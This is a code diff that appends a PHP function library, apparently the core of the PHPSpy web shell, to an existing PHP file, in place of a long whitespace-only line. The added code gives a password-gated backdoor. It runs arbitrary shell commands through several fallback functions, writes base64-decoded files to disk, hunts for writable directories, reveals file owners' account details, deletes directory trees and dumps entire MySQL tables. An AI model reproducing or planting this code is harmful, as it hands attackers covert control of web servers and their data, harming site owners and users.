@@ -1094,5 +1094,524 @@ else {
 
 <?php
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+/*======================================================
+函数库
+======================================================*/
+
+function secparam($n, $v) {
+	$v = trim($v);
+	if($v) {
+		p('<h2>'.$n.' &raquo;</h2>');
+		p('<div class="infolist">');
+		if(strpos($v, "\n") === false)
+			p($v.'<br />');
+		else
+			p('<pre>'.$v.'</pre>');
+		p('</div>');
+	}
+}
+function m($msg) {
+	echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
+	echo $msg;
+	echo '</div>';
+}
+function s_array($array) {
+	return is_array($array) ? array_map('s_array', $array) : stripslashes($array);
+}
+function scookie($key, $value, $life = 0, $prefix = 1) {
+	global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
+	$key = ($prefix ? $cookiepre : '').$key;
+	$life = $life ? $life : $cookielife;
+	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
+	setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
+}
+function loginpage() {
+	formhead();
+	makehide('act','login');
+	makeinput(array('name'=>'password','type'=>'password','size'=>'20'));
+	makeinput(array('type'=>'submit','value'=>'Login'));
+	formfoot();
+	exit;
+}
+function execute($cfe) {
+	$res = '';
+	if ($cfe) {
+		if(function_exists('system')) {
+			@ob_start();
+			@system($cfe);
+			$res = @ob_get_contents();
+			@ob_end_clean();
+		} elseif(function_exists('passthru')) {
+			@ob_start();
+			@passthru($cfe);
+			$res = @ob_get_contents();
+			@ob_end_clean();
+		} elseif(function_exists('shell_exec')) {
+			$res = @shell_exec($cfe);
+		} elseif(function_exists('exec')) {
+			@exec($cfe,$res);
+			$res = join("\n",$res);
+		} elseif(@is_resource($f = @popen($cfe,"r"))) {
+			$res = '';
+			while(!@feof($f)) {
+				$res .= @fread($f,1024); 
+			}
+			@pclose($f);
+		}
+	}
+	return $res;
+}
+function which($pr) {
+	$path = execute("which $pr");
+	return ($path ? $path : $pr); 
+}
+function cf($fname,$text){
+	if($fp=@fopen($fname,'w')) {
+		@fputs($fp,@base64_decode($text));
+		@fclose($fp);
+	}
+}
+function dirsize($cwd) { 
+	$dh = @opendir($cwd);
+	$size = 0;
+	while($file = @readdir($dh)) {
+		if ($file != '.' && $file != '..') {
+			$path = $cwd.'/'.$file;
+			$size += @is_dir($path) ? dirsize($path) : sprintf("%u", @filesize($path));
+		}
+	}
+	@closedir($dh);
+	return $size;
+}
+// 页面调试信息
+function debuginfo() {
+	global $starttime;
+	$mtime = explode(' ', microtime());
+	$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
+	echo 'Processed in '.$totaltime.' second(s)';
+}
+
+// 清除HTML代码
+function html_clean($content) {
+	$content = htmlspecialchars($content);
+	$content = str_replace("\n", "<br />", $content);
+	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
+	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
+	return $content;
+}
+
+// 获取权限
+function getChmod($file){
+	return substr(base_convert(@fileperms($file),10,8),-4);
+}
+
+function PermsColor($f) { 
+	if (!is_readable($f)) {
+		return '<span class="red">'.getPerms($f).'</span>';
+	} elseif (!is_writable($f)) {
+		return '<span class="black">'.getPerms($f).'</span>';
+	} else {
+		return '<span class="green">'.getPerms($f).'</span>';
+	}
+}
+function getPerms($file) {
+	$mode = @fileperms($file);
+	if (($mode & 0xC000) === 0xC000) {$type = 's';}
+	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
+	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
+	elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
+	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
+	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
+	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
+	else {$type = '?';}
+
+	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
+	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
+	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
+	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
+	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
+	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
+	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
+	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
+	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 
+
+	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
+	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
+	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
+ 
+	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
+}
+
+function getUser($file)	{
+	if (function_exists('posix_getpwuid')) {
+		$array = @posix_getpwuid(@fileowner($file));
+		if ($array && is_array($array)) {
+			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
+		}
+	}
+	return '';
+}
+
+function copy_paste($c,$f,$d){
+	if(is_dir($c.$f)){
+		mkdir($d.$f);
+		$dirs = scandir($c.$f);
+		if ($dirs) {
+			$dirs = array_diff($dirs, array('..', '.'));
+			foreach ($dirs as $file) {
+				copy_paste($c.$f.'/',$file, $d.$f.'/');
+			}
+		}
+	} elseif(is_file($c.$f)) {
+		copy($c.$f, $d.$f);
+	}
+}
+// 删除目录
+function deltree($deldir) {
+	$dirs = @scandir($deldir);
+	if ($dirs) {
+		$dirs = array_diff($dirs, array('..', '.'));
+		foreach ($dirs as $file) {	
+			if((is_dir($deldir.'/'.$file))) {
+				@chmod($deldir.'/'.$file,0777);
+				deltree($deldir.'/'.$file); 
+			} else {
+				@chmod($deldir.'/'.$file,0777);
+				@unlink($deldir.'/'.$file);
+			}
+		}
+		@chmod($deldir,0777);
+		return @rmdir($deldir) ? 1 : 0;
+	} else {
+		return 0;
+	}
+}
+
+// 表格行间的背景色替换
+function bg() {
+	global $bgc;
+	return ($bgc++%2==0) ? 'alt1' : 'alt2';
+}
+
+function cmp($a, $b) {
+	global $sort;
+	if(is_numeric($a[$sort[0]])) {
+		return (($a[$sort[0]] < $b[$sort[0]]) ? -1 : 1)*($sort[1]?1:-1);
+	} else {
+		return strcmp($a[$sort[0]], $b[$sort[0]])*($sort[1]?1:-1);
+	}
+}
+
+// 获取当前目录的上级目录
+function getUpPath($cwd) {
+	$pathdb = explode('/', $cwd);
+	$num = count($pathdb);
+	if ($num > 2) {
+		unset($pathdb[$num-1],$pathdb[$num-2]);
+	}
+	$uppath = implode('/', $pathdb).'/';
+	$uppath = str_replace('//', '/', $uppath);
+	return $uppath;
+}
+
+// 检查PHP配置参数
+function getcfg($varname) {
+	$result = get_cfg_var($varname);
+	if ($result == 0) {
+		return 'No';
+	} elseif ($result == 1) {
+		return 'Yes';
+	} else {
+		return $result;
+	}
+}
+
+// 获得文件扩展名
+function getext($file) {
+	$info = pathinfo($file);
+	return $info['extension'];
+}
+function GetWDirList($path){
+	global $dirdata,$j,$web_cwd;
+	!$j && $j=1;
+	$dirs = @scandir($path);
+	if ($dirs) {
+		$dirs = array_diff($dirs, array('..','.'));
+		foreach ($dirs as $file) {
+			$f=str_replace('//','/',$path.'/'.$file);
+			if(is_dir($f)){
+				if (is_writable($f)) {
+					$dirdata[$j]['filename']='/'.str_replace($web_cwd,'',$f);
+					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
+					$dirdata[$j]['chmod']=getChmod($f);
+					$dirdata[$j]['perm']=PermsColor($f);
+					$dirdata[$j]['owner']=getUser($f);
+					$dirdata[$j]['link']=$f;
+					$j++;
+				}
+				GetWDirList($f);
+			}
+		}
+		return $dirdata;
+	} else {
+		return array();
+	}
+}
+function sizecount($size) {
+	$unit = array('Bytes', 'KB', 'MB', 'GB', 'TB','PB');
+	for ($i = 0; $size >= 1024 && $i < 5; $i++) {
+		$size /= 1024;
+	}
+	return round($size, 2).' '.$unit[$i];
+}
+function p($str){
+	echo $str."\n";
+}
+
+function makehide($name,$value=''){
+	p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
+}
+
+function makeinput($arg = array()){
+	$arg['size'] = isset($arg['size']) && $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
+	$arg['type'] = isset($arg['type']) ? $arg['type'] : 'text';
+	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
+	$arg['class'] = isset($arg['class']) ? $arg['class'] : 'input';
+	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
+	$arg['value'] = isset($arg['value']) ? $arg['value'] : '';
+	if (isset($arg['newline'])) p('<p>');
+	p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] />");
+	if (isset($arg['newline'])) p('</p>');
+}
+
+function makeselect($arg = array()){
+	$onchange = isset($arg['onchange']) ? 'onchange="'.$arg['onchange'].'"' : '';
+	$arg['title'] = isset($arg['title']) ? $arg['title'] : '';
+	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
+	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
+		if (is_array($arg['option'])) {
+			foreach ($arg['option'] as $key=>$value) {
+				if ($arg['selected']==$key) {
+					p("<option value=\"$key\" selected>$value</option>");
+				} else {
+					p("<option value=\"$key\">$value</option>");
+				}
+			}
+		}
+	p("</select>");
+}
+function formhead($arg = array()) {
+	!isset($arg['method']) && $arg['method'] = 'post';
+	!isset($arg['name']) && $arg['name'] = 'form1';
+	$arg['extra'] = isset($arg['extra']) ? $arg['extra'] : '';
+	$arg['onsubmit'] = isset($arg['onsubmit']) ? "onsubmit=\"$arg[onsubmit]\"" : '';
+	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"".SELF."\" method=\"$arg[method]\" $arg[onsubmit] $arg[extra]>");
+	if (isset($arg['title'])) {
+		p('<h2>'.$arg['title'].' &raquo;</h2>');
+	}
+}
+	
+function maketext($arg = array()){
+	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
+	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
+	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"100\" rows=\"25\">$arg[value]</textarea></p>");
+}
+
+function formfooter($name = ''){
+	!$name && $name = 'submit';
+	p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
+	p('</form>');
+}
+
+function goback(){
+	global $cwd, $charset;
+	p('<form action="'.SELF.'" method="post"><input type="hidden" name="act" value="file" /><input type="hidden" name="cwd" value="'.$cwd.'" /><input type="hidden" name="charset" value="'.$charset.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
+}
+
+function formfoot(){
+	p('</form>');
+}
+
+function encode_pass($pass) {
+	$k = 'angel';
+	$pass = md5($k.$pass);
+	$pass = md5($pass.$k);
+	$pass = md5($k.$pass.$k);
+	return $pass;
+}
+
+function pr($a) {
+	p('<div style="text-align: left;border:1px solid #ddd;"><pre>'.print_r($a).'</pre></div>');
+}
+
+class DB_MySQL  {
+
+	var $querycount = 0;
+	var $link;
+	var $charsetdb = array();
+	var $charset = '';
+
+	function connect($dbhost, $dbuser, $dbpass, $dbname='') {
+		@ini_set('mysql.connect_timeout', 5);
+		if(!$this->link = @mysql_connect($dbhost, $dbuser, $dbpass, 1)) {
+			$this->halt('Can not connect to MySQL server');
+		}
+		if($this->version() > '4.1') {
+			$this->setcharset($this->charset);
+		}
+		$dbname && mysql_select_db($dbname, $this->link);
+	}
+	function setcharset($charset) {
+		if ($charset && $this->charsetdb[$charset]) {
+			if(function_exists('mysql_set_charset')) {
+				mysql_set_charset($this->charsetdb[$charset], $this->link);
+			} else {
+				$this->query("SET character_set_connection='".$this->charsetdb[$charset]."', character_set_results='".$this->charsetdb[$charset]."', character_set_client=binary");
+			}
+		}
+	}
+	function select_db($dbname) {
+		return mysql_select_db($dbname, $this->link);
+	}
+	function geterrdesc() {
+		return (($this->link) ? mysql_error($this->link) : mysql_error());
+	}
+	function geterrno() {
+		return intval(($this->link) ? mysql_errno($this->link) : mysql_errno());
+	}
+	function fetch($query, $result_type = MYSQL_ASSOC) { //MYSQL_NUM
+		return mysql_fetch_array($query, $result_type);
+	}
+	function query($sql) {
+		//echo '<p style="color:#f00;">'.$sql.'</p>';
+		if(!($query = mysql_query($sql, $this->link))) {
+			$this->halt('MySQL Query Error', $sql);
+		}
+		$this->querycount++;
+		return $query;
+	}
+	function query_res($sql) { 
+		$res = '';
+		if(!$res = mysql_query($sql, $this->link)) { 
+			$res = 0;
+		} else if(is_resource($res)) {
+			$res = 1; 
+		} else {
+			$res = 2;
+		}
+		$this->querycount++;
+		return $res;
+	}
+	function num_rows($query) {
+		$query = mysql_num_rows($query);
+		return $query;
+	}
+	function num_fields($query) {
+		$query = mysql_num_fields($query);
+		return $query;
+	}
+	function affected_rows() {
+		return mysql_affected_rows($this->link);
+	}
+	function result($query, $row) {
+		$query = mysql_result($query, $row);
+		return $query;
+	}	
+	function free_result($query) {
+		$query = mysql_free_result($query);
+		return $query;
+	}
+	function version() {
+		return mysql_get_server_info($this->link);
+	}
+	function close() {
+		return mysql_close($this->link);
+	}
+	function halt($msg =''){
+		echo "<h2>".htmlspecialchars($msg)."</h2>\n";
+		echo "<p class=\"b\">Mysql error description: ".htmlspecialchars($this->geterrdesc())."</p>\n";
+		echo "<p class=\"b\">Mysql error number: ".$this->geterrno()."</p>\n";
+		exit;
+	}
+	function get_fields_meta($result) {
+		$fields = array();
+		$num_fields = $this->num_fields($result);
+		for ($i = 0; $i < $num_fields; $i++) {
+			$field = mysql_fetch_field($result, $i);
+			$fields[] = $field;
+		}
+		return $fields;
+	}
+	function sqlAddSlashes($s = ''){
+		$s = str_replace('\\', '\\\\', $s);
+		$s = str_replace('\'', '\'\'', $s);
+		return $s;
+	}
+	// 备份数据库
+	function sqldump($table, $fp=0) {
+		$crlf = (IS_WIN ? "\r\n" : "\n");
+		$search = array("\x00", "\x0a", "\x0d", "\x1a"); //\x08\\x09, not required
+		$replace = array('\0', '\n', '\r', '\Z');
+
+		if (isset($this->charset) && isset($this->charsetdb[$this->charset])) {
+			$set_names = $this->charsetdb[$this->charset];
+		} else {
+			$set_names = $this->charsetdb['utf-8'];
+		}
+		$tabledump = 'SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";'.$crlf.$crlf;
+		$tabledump .= '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;'.$crlf
+			   . '/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;'.$crlf
+			   . '/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;'.$crlf
+			   . '/*!40101 SET NAMES ' . $set_names . ' */;'.$crlf.$crlf;
+
+		$tabledump .= "DROP TABLE IF EXISTS `$table`;".$crlf;
+		$res = $this->query("SHOW CREATE TABLE $table");
+		$create = $this->fetch($res, MYSQL_NUM);
+		$tabledump .= $create[1].';'.$crlf.$crlf;
+		if (strpos($tabledump, "(\r\n ")) {
+			$tabledump = str_replace("\r\n", $crlf, $tabledump);
+		} elseif (strpos($tabledump, "(\n ")) {
+			$tabledump = str_replace("\n", $crlf, $tabledump);
+		} elseif (strpos($tabledump, "(\r ")) {
+			$tabledump = str_replace("\r", $crlf, $tabledump);
+		}
+		unset($create);
+
+		if ($fp) {
+			fwrite($fp,$tabledump);
+		} else {
+			echo $tabledump;
+		}
+		$tabledump = '';
+		$rows = $this->query("SELECT * FROM $table");
+		$fields_cnt = $this->num_fields($rows);
+		$fields_meta = $this->get_fields_meta($rows);
+
+		while ($row = $this->fetch($rows, MYSQL_NUM)) {
+			for ($j = 0; $j < $fields_cnt; $j++) {
+				if (!isset($row[$j]) || is_null($row[$j])) {
+					$values[] = 'NULL';
+				} elseif ($fields_meta[$j]->numeric && $fields_meta[$j]->type != 'timestamp' && !$fields_meta[$j]->blob) {
+					$values[] = $row[$j];
+				} elseif ($fields_meta[$j]->blob) {
+					if (empty($row[$j]) && $row[$j] != '0') {
+						$values[] = '\'\'';
+					} else {
+						$values[] = '0x'.bin2hex($row[$j]);
+					}
+				} else {
+					$values[] = '\''.str_replace($search, $replace, $this->sqlAddSlashes($row[$j])).'\'';
+				}
+			}
+			$tabledump = 'INSERT INTO `'.$table.'` VALUES('.implode(', ', $values).');'.$crlf;
+			unset($values);
+			if ($fp) {
+				fwrite($fp,$tabledump);
+			} else {
+				echo $tabledump;
+			}
+		}
+		$this->free_result($rows);
+	}
+}
 ?>
